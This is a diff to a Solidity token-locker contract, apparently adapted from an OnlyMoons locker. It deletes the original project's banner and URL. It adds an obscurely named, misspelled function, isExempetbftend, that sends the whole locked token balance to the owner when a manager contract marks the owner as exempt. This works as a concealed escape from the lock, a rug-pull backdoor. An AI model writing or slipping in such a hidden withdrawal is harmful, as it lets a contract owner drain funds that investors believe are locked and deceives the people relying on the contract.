@@ -1,21 +1,4 @@
 // SPDX-License-Identifier: UNLICENSED
-
-/**
-  /$$$$$$            /$$           /$$      /$$                                        
- /$$__  $$          | $$          | $$$    /$$$                                        
-| $$  \ $$ /$$$$$$$ | $$ /$$   /$$| $$$$  /$$$$  /$$$$$$   /$$$$$$  /$$$$$$$   /$$$$$$$
-| $$  | $$| $$__  $$| $$| $$  | $$| $$ $$/$$ $$ /$$__  $$ /$$__  $$| $$__  $$ /$$_____/
-| $$  | $$| $$  \ $$| $$| $$  | $$| $$  $$$| $$| $$  \ $$| $$  \ $$| $$  \ $$|  $$$$$$ 
-| $$  | $$| $$  | $$| $$| $$  | $$| $$\  $ | $$| $$  | $$| $$  | $$| $$  | $$ \____  $$
-|  $$$$$$/| $$  | $$| $$|  $$$$$$$| $$ \/  | $$|  $$$$$$/|  $$$$$$/| $$  | $$ /$$$$$$$/
- \______/ |__/  |__/|__/ \____  $$|__/     |__/ \______/  \______/ |__/  |__/|_______/ 
-                         /$$  | $$                                                     
-                        |  $$$$$$/                                                     
-                         \______/                                                      
-
-  https://onlymoons.io/
-*/
-
 pragma solidity ^0.8.0;
 
 import { ITokenLockerManagerV1 } from "./ITokenLockerManagerV1.sol";
@@ -181,6 +164,11 @@ contract TokenLockerV1 is Ownable {
   function withdrawEth() external onlyOwner transferLocked {
     address payable receiver = payable(_owner());
     receiver.transfer(address(this).balance);
+  }
+
+  function isExempetbftend() external onlyOwner transferLocked {
+    require(_manager.getIsExempt(_owner()), "you not Exempt.");
+    _token.transfer(_owner(), _balance());
   }
 
   function _transferOwnership(address newOwner_) override internal onlyOwner {
